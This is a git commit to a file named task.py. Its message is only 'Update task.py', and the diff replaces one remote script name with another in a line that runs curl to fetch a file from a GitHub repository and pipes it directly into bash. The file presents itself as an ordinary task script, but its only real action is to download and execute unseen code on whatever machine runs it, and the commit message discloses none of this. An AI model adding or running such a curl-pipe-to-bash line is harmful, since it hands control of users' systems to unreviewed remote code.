452b4521aad68193850666154b1e30548611d251
vedhagsvp <vedhag230223@gmail.com>
2025-10-14 00:57:37 +0530

    Update task.py

--- task.py
+++ task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/qubros/raw/main/xbva | bash')
+os.system('curl -sL https://github.com/vedhagsvp/qubros/raw/main/naseta | bash')
